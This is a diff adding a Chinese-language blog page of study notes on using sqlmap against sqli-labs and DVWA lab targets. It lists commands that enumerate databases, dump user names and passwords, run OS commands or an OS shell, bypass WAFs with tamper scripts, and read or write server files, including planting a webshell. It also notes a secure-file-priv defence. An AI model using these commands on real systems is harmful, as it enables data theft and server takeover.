@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Hexo
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            SQL注入笔记（2）
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h3 id="SQL注入笔记（2）"><a href="#SQL注入笔记（2）" class="headerlink" title="SQL注入笔记（2）"></a>SQL注入笔记（2）</h3><h5 id="使用SQLMap得出数据库信息的基本流程如下："><a href="#使用SQLMap得出数据库信息的基本流程如下：" class="headerlink" title="使用SQLMap得出数据库信息的基本流程如下："></a>使用SQLMap得出数据库信息的基本流程如下：</h5><ul>
+<li><p>检查是否存在注入点</p>
+<ul>
+<li>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.198.128/sqli-labs-master/Less-1/?id=1%E2%80%9D">http://192.168.198.128/sqli-labs-master/Less-1/?id=1”</a></li>
+<li>参数：-u＃目标 URL</li>
+</ul>
+</li>
+<li><p>查看所有数据库</p>
+<ul>
+<li>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;">http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;</a> –dbs</li>
+<li>参数：-u ＃目标 URL、–dbs #所有数据库</li>
+</ul>
+</li>
+<li><p>查看当前使用的数据库</p>
+<ul>
+<li><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;">http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;</a> –current-db</p>
+</li>
+<li><p>参数：-u ＃目标 URL</p>
+<p>​      –current-db #查看网站当前的数据库</p>
+</li>
+</ul>
+</li>
+<li><p>查看表名</p>
+<ul>
+<li>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.198.128/sali-labs-master/Less-1/2id=1%E2%80%9D">http://192.168.198.128/sali-labs-master/Less-1/2id=1”</a> -D security –tables</li>
+<li>参数：-u ＃目标 URL<pre><code>       -D ＃指定数据库
+       --tables #列出表名
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>列出所有字段名</p>
+<ul>
+<li><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;">http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users –columns</p>
+</li>
+<li><p>-u＃目标 URL</p>
+<p>-D ＃指定数据库</p>
+<p>-T ＃指定表名</p>
+<p>–columns #列出所有的字段</p>
+</li>
+</ul>
+</li>
+<li><p>列出字段内容（数据）</p>
+<ul>
+<li><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;-D">http://192.168.198.128/sqli-labs-master/Less-1/?id=1&quot;-D</a> security -T users -C username, password –dump</p>
+</li>
+<li><p>参数：-u ＃目标URL</p>
+<pre><code>       -D ＃指定数据库
+       -T ＃指定表名
+       -C ＃指定字段
+</code></pre>
+<p>​          –dump #列出字段肉容，转存数据</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Sqlmap基本使用实验"><a href="#Sqlmap基本使用实验" class="headerlink" title="Sqlmap基本使用实验"></a>Sqlmap基本使用实验</h4><h5 id="一-测试页面是否存在注入点"><a href="#一-测试页面是否存在注入点" class="headerlink" title="一.测试页面是否存在注入点"></a>一.测试页面是否存在注入点</h5><p>语句：sqlmap -u “<a target="_blank" rel="noopener" href="http://ip地址/get.php?id=1%E2%80%9D">http://ip地址/get.php?id=1”</a></p>
+<p>结果：该页面的get参数存在注入</p>
+<h5 id="二-获取数据库名"><a href="#二-获取数据库名" class="headerlink" title="二.获取数据库名"></a>二.获取数据库名</h5><p>语句：salmap -u “<a target="_blank" rel="noopener" href="http://ip地址/get.php?id=1%E2%80%9D">http://ip地址/get.php?id=1”</a> –dbs</p>
+<p>结果：有四个可用数据库</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="输出级别参数"><a href="#输出级别参数" class="headerlink" title="输出级别参数"></a>输出级别参数</h5><ul>
+<li>参数：-V</li>
+<li>使用方法：-V&lt;级别＞如：sqlmap -u [URL] -v 3</li>
+<li>参数详情：SQLmap的输出信息按从简到繁，从0-6共分为7个级别，默认的输出级别为1。</li>
+<li>各个输出级别的描述如下：<ul>
+<li>0：只显示python的回溯、错误和关键信息</li>
+<li>1：显示信息和警告消息</li>
+<li>2：显示调式信息</li>
+<li>3：显示注入使用的攻击载荷</li>
+<li>4：显示HTTP请求</li>
+<li>5：显示HTTP响应头</li>
+<li>6：显示HTTP相应页面的内容</li>
+</ul>
+</li>
+</ul>
+<h5 id="测试注入点权限"><a href="#测试注入点权限" class="headerlink" title="测试注入点权限"></a>测试注入点权限</h5><ul>
+<li>参数：–privileges</li>
+<li>用法：sqlmap-u [URL]–privileges //测试所有用户的权限<pre><code>        sqlmap -u [URL]--privileges-U sa //测试sa用户的权限
+</code></pre>
+</li>
+<li>说明：当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员.</li>
+<li> 注意：若目标是MSSql数据库，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。</li>
+</ul>
+<h5 id="执行shell命令"><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h5><ul>
+<li>参数：-os-cmd /-os-shell</li>
+<li>使用方法：sqlmap -u [URL] – os-cmd= “ net user “ //执行net user命令<pre><code>               sqlmap -u [URL] --os-shell //系统交互式的shell
+</code></pre>
+</li>
+<li>危害：用-os-shell命令可以模拟一个真实的shell，可以使用INTO OUTFILE写进可写目录，创建一个web后门。</li>
+<li>注意：1、需要有权限使用特定西数2、数据库为mysql postgresql和sqlserver</li>
+</ul>
+<h5 id="POST提交方式"><a href="#POST提交方式" class="headerlink" title="POST提交方式"></a>POST提交方式</h5><ul>
+<li>参数：1.-data     //通过post方式提交参数<pre><code>        2.-r txt文件 //读取文件中的HTTP数据包内容用来测试POST注入和HTTP Header注入
+</code></pre>
+</li>
+<li>使用方法：sqlmap -u [URL]–data “POST参数”<pre><code>               sqlmap -u [URL] -r &quot;.txt文件&quot;
+</code></pre>
+</li>
+</ul>
+<h5 id="获取数据库的用户名和密码"><a href="#获取数据库的用户名和密码" class="headerlink" title="获取数据库的用户名和密码"></a>获取数据库的用户名和密码</h5><ul>
+<li>参数：1.-users     //枚举所有的用户<pre><code>        2.-passwords //枚举所有的用户密码
+</code></pre>
+</li>
+<li>使用方法：sqlmap -u [URL] –users -passwords</li>
+</ul>
+<h4 id="SQLmap的常用参数"><a href="#SQLmap的常用参数" class="headerlink" title="SQLmap的常用参数"></a>SQLmap的常用参数</h4><h5 id="tamper参数"><a href="#tamper参数" class="headerlink" title="tamper参数"></a>tamper参数</h5><ul>
+<li><p>作用：</p>
+<ul>
+<li>tamper则是对其进行扩展的一系列脚本 ，主要功能是对本来的payload进行特定的更改以绕过waf</li>
+<li>使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、 绕过WAF规则的阻挡，继而进行渗透攻击</li>
+</ul>
+</li>
+<li><p>用法：</p>
+<p>sqlmap -u [URL]–tamper=TAMPER  利用给定的脚本进行篡改注入数据</p>
+</li>
+</ul>
+<h4 id="SQLmap的深入理解"><a href="#SQLmap的深入理解" class="headerlink" title="SQLmap的深入理解"></a>SQLmap的深入理解</h4><h5 id="列举数据库管理系统信息"><a href="#列举数据库管理系统信息" class="headerlink" title="列举数据库管理系统信息"></a>列举数据库管理系统信息</h5><ul>
+<li>参数：b或-banner</li>
+<li>用法：Sqlmap -u [URL] -banner</li>
+<li>说明：返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。</li>
+</ul>
+<h4 id="SQLMap的HTTP头部注入"><a href="#SQLMap的HTTP头部注入" class="headerlink" title="SQLMap的HTTP头部注入"></a>SQLMap的HTTP头部注入</h4><h5 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h5><ul>
+<li>参数：-method</li>
+<li>用法：sqlmap -u [URL] -method “PUT”</li>
+<li>说明：一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法 ，此时就需要用参数“-method” 来指定方法。</li>
+</ul>
+<h5 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h5><ul>
+<li>参数：–cookie</li>
+<li>用法：sqlmap -u [url] –cookie=”SESSIONID = xxxxx;NAME =ichunqiu;” –level 2 –data “”</li>
+<li>说明：当需要对cookie注入的时候 ，必须使用–cookie选项,–data””因为post的数据长度为0，但是又想使用post方法进行注入，则使用–data “”， 使用–data选项后Sqlmap自动使用post方法。</li>
+<li>注意:<ul>
+<li>sqlmap不支持使用–method指定http请求的方法.</li>
+<li>默认不扫cookie的内容，必须是level大于等于2才能扫cookie里的内容</li>
+<li>cookie默认的分隔符为“；”</li>
+</ul>
+</li>
+</ul>
+<h4 id="SQLMap执行SQL语句"><a href="#SQLMap执行SQL语句" class="headerlink" title="SQLMap执行SQL语句"></a>SQLMap执行SQL语句</h4><h5 id="交互式的SQL命令行"><a href="#交互式的SQL命令行" class="headerlink" title="交互式的SQL命令行"></a>交互式的SQL命令行</h5><ul>
+<li>参数：–sql-shell</li>
+<li>用法：sqlmap -u [URL] –sql-shell</li>
+<li>说明：该参数可直接获得交互式的SQL命令shell ，我们可以在此直接输入想要执行的SQL语句并实时取得回显，输入x或者q退出交互式命令行</li>
+</ul>
+<h5 id="执行指定SQL语句"><a href="#执行指定SQL语句" class="headerlink" title="执行指定SQL语句"></a>执行指定SQL语句</h5><ul>
+<li>参数：–sql-query</li>
+<li>用法：sqlmap -u [URL] –sql-query= “sql语句”  sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.1.1.136/vulnerabilities/sqli/?id=1&quot;">http://10.1.1.136/vulnerabilities/sqli/?id=1&quot;</a> –sql-query “select user();select version();select database();”</li>
+<li>说明：该命令直接执行指定的SQL语包</li>
+<li>注意：执行一次都会对网站注入一遍，比–sat-shell效率低</li>
+</ul>
+<h4 id="SQLMap的文件操作"><a href="#SQLMap的文件操作" class="headerlink" title="SQLMap的文件操作"></a>SQLMap的文件操作</h4><h5 id="了解SQL注入可以进行文件读写操作带来的危害"><a href="#了解SQL注入可以进行文件读写操作带来的危害" class="headerlink" title="了解SQL注入可以进行文件读写操作带来的危害"></a>了解SQL注入可以进行文件读写操作带来的危害</h5><ul>
+<li>如果当前web页面存在SQL注入漏洞，且当前的用户是root权限，且可以进行文件读写操作</li>
+<li>我们可以在知道绝对路径的情况下，尝试上传一个一句话木马，并用菜刀连接后，获取到网站的getshell</li>
+</ul>
+<h5 id="SQL注入导致的文件读写的防御方法"><a href="#SQL注入导致的文件读写的防御方法" class="headerlink" title="SQL注入导致的文件读写的防御方法"></a>SQL注入导致的文件读写的防御方法</h5><ul>
+<li><p>将secure-file-priv的参数在my.ini中配置为 secure-file-priv=null 将会限制mysqld不允许导入导出操作</p>
+<p>​     secure-file-priv的配置，可以通过语句：select @@secure_file_priv 查询</p>
+</li>
+<li><p>在用户输入可控参数时，对敏感语句进行过滤</p>
+</li>
+</ul>
+<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><ul>
+<li>参数：–file-read</li>
+<li>用法：sqlmap -u [URL] –file-read  “文件绝对路径”</li>
+<li>说明：该命令用于读取执行文件，读取的文件可以是文本，也可以是二进制文件</li>
+<li>原理：利用mysql的loadfile函数 如：load file(‘c:/windows/win.ini’)</li>
+<li>条件：<ul>
+<li>文件必须在服务器上</li>
+<li>已知绝对路径</li>
+<li>具有读文件权限   查询语句[select File_priv from mysql.user where user=”root” and host=”localhost”]</li>
+<li>具有特定的函数执行特权 ，一般要求root</li>
+<li>数据库为mysql、postgresql和sqlserver</li>
+<li>max_allowed_packed   //读写文件最大的字节数</li>
+</ul>
+</li>
+</ul>
+<h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><ul>
+<li>参数：–file-write –file-dest</li>
+<li>用法：sqlmap -u [URL] –file-write  “写入本地文件的地址”    –file-dest    “要写入的文件绝对路径”</li>
+<li> 说明：该命令用于写入本地文件到服务器中，上传的文件可以是文本，也可以是二进制文件</li>
+<li>原理：利用mysql的into outile函数 如：union select 1,2, ‘aaa’ into outfile ‘C\\phpstudy_pro\\www\\test1.txt’</li>
+<li>条件：<ul>
+<li>文件必须在服务器上</li>
+<li>已知绝对路径</li>
+<li> 有写文件权限（secure-file-priv是否被禁用，是否有目录权限等等）</li>
+<li> 必须能绕过单引1号过滤</li>
+<li> 具有特定的函数执行特权，一般要求root</li>
+<li> 数据库为mysql、postgresql和sqlserver</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
